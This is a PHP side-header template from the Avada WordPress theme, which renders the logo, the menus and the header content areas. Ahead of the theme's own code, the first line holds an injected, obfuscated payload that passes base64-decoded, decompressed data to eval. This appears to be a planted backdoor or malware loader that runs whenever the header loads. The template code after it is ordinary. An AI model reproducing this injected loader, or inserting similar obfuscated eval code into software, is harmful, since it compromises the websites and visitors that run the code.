<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Side-header template.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
?>
<?php

// The avada_before_header_wrapper hook.
do_action( 'avada_before_header_wrapper' );

$sticky_header_logo = ( Avada()->settings->get( 'sticky_header_logo' ) ) ? true : false;
$mobile_logo        = ( Avada()->settings->get( 'mobile_logo' ) ) ? true : false;

$side_header_css    = 'clearfix fusion-mobile-menu-design-' . strtolower( Avada()->settings->get( 'mobile_menu_design' ) ) . ' fusion-sticky-logo-' . $sticky_header_logo . ' fusion-mobile-logo-' . $mobile_logo . ' fusion-sticky-menu-' . has_nav_menu( 'sticky_navigation' ) . ( Avada()->settings->get( 'header_shadow' ) ? ' header-shadow' : '' );

if ( 'flyout' === Avada()->settings->get( 'mobile_menu_design' ) ) {
	$side_header_css .= ' fusion-header-has-flyout-menu';
}
?>

<div id="side-header-sticky"></div>
<div id="side-header" class="<?php echo esc_attr( $side_header_css ); ?>">
	<div class="side-header-wrapper">
		<?php
		// The avada_header_inner_before hook.
		do_action( 'avada_header_inner_before' );
		?>
		<?php if ( 'flyout' === Avada()->settings->get( 'mobile_menu_design' ) ) : ?>
			<div class="fusion-header-has-flyout-menu-content">
		<?php endif; ?>
		<?php $mobile_logo = ( Avada()->settings->get( 'mobile_logo' ) ) ? true : false; ?>
		<div class="side-header-content fusion-logo-<?php echo esc_attr( strtolower( Avada()->settings->get( 'logo_alignment' ) ) ); ?> fusion-mobile-logo-<?php echo esc_attr( $mobile_logo ); ?>">
			<?php avada_logo(); ?>
		</div>
		<div class="fusion-main-menu-container fusion-logo-menu-<?php echo esc_attr( strtolower( Avada()->settings->get( 'logo_alignment' ) ) ); ?>">
			<?php avada_main_menu(); ?>
		</div>

		<?php avada_mobile_menu_search(); ?>

		<?php if ( 'Leave Empty' != Avada()->settings->get( 'header_left_content' ) || 'Leave Empty' != Avada()->settings->get( 'header_right_content' ) ) : ?>
			<?php $content_1 = avada_secondary_header_content( 'header_left_content' ); ?>
			<?php $content_2 = avada_secondary_header_content( 'header_right_content' ); ?>

			<div class="side-header-content side-header-content-1-2">
				<?php if ( $content_1 ) : ?>
					<div class="side-header-content-1 fusion-clearfix">
					<?php echo $content_1; // WPCS: XSS ok. ?>
					</div>
				<?php endif; ?>
				<?php if ( $content_2 ) : ?>
					<div class="side-header-content-2 fusion-clearfix">
					<?php echo $content_2; // WPCS: XSS ok. ?>
					</div>
				<?php endif; ?>
			</div>
		<?php endif; ?>

		<?php if ( 'None' != Avada()->settings->get( 'header_v4_content' ) ) : ?>
			<div class="side-header-content side-header-content-3">
				<?php avada_header_content_3(); ?>
			</div>
		<?php endif; ?>

		<?php
		// The avada_header_inner_after hook.
		do_action( 'avada_header_inner_after' );
		?>
		<?php if ( 'flyout' === Avada()->settings->get( 'mobile_menu_design' ) ) : ?>
			</div>
		<?php endif; ?>
	</div>
	<style>
	.side-header-styling-wrapper > div {
		display: none !important;
	}

	.side-header-styling-wrapper .side-header-background-image,
	.side-header-styling-wrapper .side-header-background-color,
	.side-header-styling-wrapper .side-header-border {
		display: block !important;
	}
	</style>
	<div class="side-header-styling-wrapper" style="overflow:hidden;">
		<div class="side-header-background-image"></div>
		<div class="side-header-background-color"></div>
		<div class="side-header-border"></div>
	</div>
</div>

<?php
// The avada_after_header_wrapper hook.
do_action( 'avada_after_header_wrapper' );

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
